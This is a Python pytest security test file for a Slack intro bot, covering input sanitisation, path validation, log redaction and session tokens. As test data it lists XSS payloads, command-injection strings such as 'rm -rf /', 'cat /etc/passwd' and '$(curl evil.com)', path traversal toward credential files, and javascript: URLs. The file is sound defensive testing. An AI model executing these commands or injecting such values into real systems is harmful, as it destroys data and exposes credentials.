#!/usr/bin/env python3
"""
Security Tests for Slack Intro Bot

Comprehensive security testing including XSS, injection, path traversal, and more.
"""

import pytest
import os
import tempfile
import stat
from security_config import InputValidator, SecurityManager, SecureLogger


class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<iframe src="evil.com"></iframe>',
            '<object data="evil.swf"></object>',
            '<embed src="evil.swf">',
            '<link rel="stylesheet" href="evil.css">',
            '<meta http-equiv="refresh" content="0;url=evil.com">',
            'test<script>alert(1)</script>test'
        ]
        
        validator = InputValidator()
        for malicious in malicious_inputs:
            sanitized = validator.sanitize_text(malicious)
            # Verify dangerous tags are removed
            assert '<script' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
            assert '<iframe' not in sanitized.lower()
            assert '<object' not in sanitized.lower()
            assert '<embed' not in sanitized.lower()
            assert '<link' not in sanitized.lower()
            assert '<meta' not in sanitized.lower()
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        malicious_inputs = [
            'test; rm -rf /',
            'test && cat /etc/passwd',
            'test | whoami',
            'test $(curl evil.com)',
            'test `whoami`',
            'test & net user',
            'test;ls -la'
        ]
        
        validator = InputValidator()
        for malicious in malicious_inputs:
            sanitized = validator.sanitize_text(malicious)
            # Verify dangerous characters are removed
            assert ';' not in sanitized
            assert '|' not in sanitized
            assert '`' not in sanitized
            assert '$' not in sanitized
            assert '&' not in sanitized
    
    def test_name_validation(self):
        """Test name field validation"""
        validator = InputValidator()
        
        # Valid names (ASCII only as per current regex)
        valid_names = [
            'John Doe',
            "O'Brien",
            'Mary-Jane',
            'Dr. Smith'
        ]
        for name in valid_names:
            assert validator.validate_name(name)
        
        # Invalid names
        invalid_names = [
            '<script>alert(1)</script>',
            'test@example.com',
            'user123; DROP TABLE users;',
            '../../../etc/passwd',
            'a' * 101  # Too long
        ]
        for name in invalid_names:
            assert not validator.validate_name(name)
    
    def test_username_validation(self):
        """Test username validation"""
        validator = InputValidator()
        
        # Valid usernames
        valid_usernames = [
            'johndoe',
            'john_doe',
            'john-doe',
            'john.doe',
            'user123'
        ]
        for username in valid_usernames:
            assert validator.validate_username(username)
        
        # Invalid usernames
        invalid_usernames = [
            'john doe',  # Space not allowed
            'john@doe',  # @ not allowed
            '<script>',
            '../admin',
            'a' * 51  # Too long
        ]
        for username in invalid_usernames:
            assert not validator.validate_username(username)
    
    def test_date_validation(self):
        """Test date string validation"""
        validator = InputValidator()
        
        # Valid dates (format-wise, not checking actual calendar validity)
        assert validator.validate_date('2025-09-29')
        assert validator.validate_date('2024-01-01')
        
        # Invalid date formats
        assert not validator.validate_date('2025/09/29')
        assert not validator.validate_date('29-09-2025')
        assert not validator.validate_date('<script>')
        assert not validator.validate_date('not-a-date')
    
    def test_timestamp_validation(self):
        """Test timestamp validation"""
        validator = InputValidator()
        
        # Valid timestamps
        assert validator.validate_timestamp('2025-09-29T10:30:45.123Z')
        assert validator.validate_timestamp('2024-01-01T00:00:00.000Z')
        
        # Invalid timestamps
        assert not validator.validate_timestamp('2025-09-29 10:30:45')
        assert not validator.validate_timestamp('invalid')
    
    def test_input_length_limits(self):
        """Test input length limiting"""
        validator = InputValidator()
        
        # Test max length enforcement
        long_input = 'a' * 20000
        sanitized = validator.sanitize_text(long_input, max_length=10000)
        assert len(sanitized) <= 10000
    
    def test_control_character_removal(self):
        """Test removal of control characters"""
        validator = InputValidator()
        
        # Test with various control characters
        text_with_control_chars = "Hello\x00World\x01Test\x1F"
        sanitized = validator.sanitize_text(text_with_control_chars)
        
        # Verify control characters are removed
        assert '\x00' not in sanitized
        assert '\x01' not in sanitized
        assert '\x1F' not in sanitized


class TestFileOperations:
    """Test file operation security"""
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        security = SecurityManager()
        
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32',
            './../../sensitive_file.txt',
            'test/../../../etc/shadow',
            '/etc/passwd',
            'C:\\Windows\\System32\\config\\SAM'
        ]
        
        for malicious in malicious_paths:
            assert not security.validate_file_operation(malicious)
    
    def test_filename_validation(self):
        """Test filename validation"""
        validator = InputValidator()
        
        # Valid filenames
        valid_files = [
            'report.md',
            'data.json',
            'notes.txt',
            'daily_intros_2025-09-29.md'
        ]
        for filename in valid_files:
            assert validator.validate_filename(filename, ['.md', '.json', '.txt'])
        
        # Invalid filenames
        invalid_files = [
            '../etc/passwd',
            'test/file.md',
            'file:name.md',
            'file*name.md',
            'file?name.md',
            'file<name>.md',
            'file|name.md',
            'a' * 300 + '.md',  # Too long
            'script.js',  # Wrong extension
            'malware.exe'  # Dangerous extension
        ]
        for filename in invalid_files:
            assert not validator.validate_filename(filename, ['.md', '.json', '.txt'])
    
    def test_file_permissions(self):
        """Test secure file permissions"""
        with tempfile.NamedTemporaryFile(delete=False) as f:
            filepath = f.name
        
        try:
            # Create file with secure permissions
            os.chmod(filepath, 0o600)
            
            # Verify permissions
            file_stat = os.stat(filepath)
            mode = stat.S_IMODE(file_stat.st_mode)
            
            # Should be read/write for owner only
            assert mode == 0o600
            
            # Verify no group or other permissions
            assert not (mode & stat.S_IRGRP)
            assert not (mode & stat.S_IWGRP)
            assert not (mode & stat.S_IROTH)
            assert not (mode & stat.S_IWOTH)
        finally:
            os.unlink(filepath)
    
    def test_directory_validation(self):
        """Test directory path validation"""
        security = SecurityManager()
        
        # Valid directories
        assert security.validate_file_operation('./welcome_messages', 'create')
        assert security.validate_file_operation('welcome_messages', 'create')
        
        # Invalid directories
        assert not security.validate_file_operation('../../../', 'create')
        assert not security.validate_file_operation('/etc/', 'create')


class TestSecureLogging:
    """Test secure logging functionality"""
    
    def test_sensitive_data_redaction(self):
        """Test that sensitive data is redacted from logs"""
        secure_logger = SecureLogger()
        
        sensitive_messages = [
            "API Key: abc123def456",
            "password='mypassword123'",
            "token = 'xoxb-1234567890'",
            "secret: supersecret",
            "api-key=sk_test_123456"
        ]
        
        for message in sensitive_messages:
            sanitized = secure_logger.sanitize_log_message(message)
            # Verify the sensitive value is marked as redacted
            assert '[REDACTED]' in sanitized or message == sanitized


class TestSecurityManager:
    """Test SecurityManager functionality"""
    
    def test_input_sanitization(self):
        """Test input data sanitization"""
        security = SecurityManager()
        
        raw_data = {
            'first_name': 'John<script>alert(1)</script>',
            'username': 'johndoe',
            'message_text': 'Hello; rm -rf /',
            'timestamp': '2025-09-29T10:00:00.000Z',
            'user_id': 'U123456'
        }
        
        sanitized = security.validate_and_sanitize_input(raw_data)
        
        # Verify dangerous content is removed
        assert '<script>' not in sanitized['first_name']
        assert ';' not in sanitized['message_text']
        # Note: The word 'rm' itself isn't dangerous, only the command injection chars (;, |, etc.)
    
    def test_session_token_generation(self):
        """Test secure session token generation"""
        security = SecurityManager()
        
        # Generate multiple tokens
        tokens = [security.generate_session_token() for _ in range(10)]
        
        # Verify all tokens are unique
        assert len(set(tokens)) == len(tokens)
        
        # Verify tokens are sufficiently long
        for token in tokens:
            assert len(token) >= 32
    
    def test_session_creation_and_validation(self):
        """Test session creation and validation"""
        security = SecurityManager()
        
        # Create session
        token = security.create_session()
        
        # Validate valid token
        assert security.validate_session_token(token)
        
        # Validate invalid token
        assert not security.validate_session_token('invalid_token')
        assert not security.validate_session_token('')


class TestSecurityIntegration:
    """Integration tests for security features"""
    
    def test_end_to_end_message_processing(self):
        """Test end-to-end message processing with security"""
        from daily_intros import parse_intro_message
        
        # Test message with malicious content
        message = {
            'user': {
                'id': 'U123456',
                'real_name': 'John<script>alert(1)</script>Doe',
                'name': 'johndoe'
            },
            'text': 'Hi everyone; rm -rf /',
            'ts_time': '2025-09-29T10:00:00.000Z',
            'permalink': 'https://slack.com/message/123'
        }
        
        result = parse_intro_message(message)
        
        # Verify malicious content is sanitized
        if result:
            assert '<script>' not in result['real_name']
            assert ';' not in result['message_text']
    
    def test_file_operation_security(self):
        """Test file operation security end-to-end"""
        from daily_intros import save_daily_intro_report
        
        # Try to save report with malicious path
        with pytest.raises(ValueError):
            save_daily_intro_report(
                [],
                output_dir='../../../etc/',
                output_date='2025-09-29'
            )
    
    def test_linkedin_extraction_security(self):
        """Test LinkedIn URL extraction with malicious URLs"""
        from daily_intros import extract_linkedin_link
        
        # Test with various malicious URLs
        malicious_texts = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)'
        ]
        
        for text in malicious_texts:
            result = extract_linkedin_link(text)
            # Should not extract malicious URLs
            assert result is None or 'javascript:' not in result.lower()
            assert result is None or 'data:' not in result.lower()
            assert result is None or 'vbscript:' not in result.lower()


if __name__ == '__main__':
    pytest.main([__file__, '-v'])

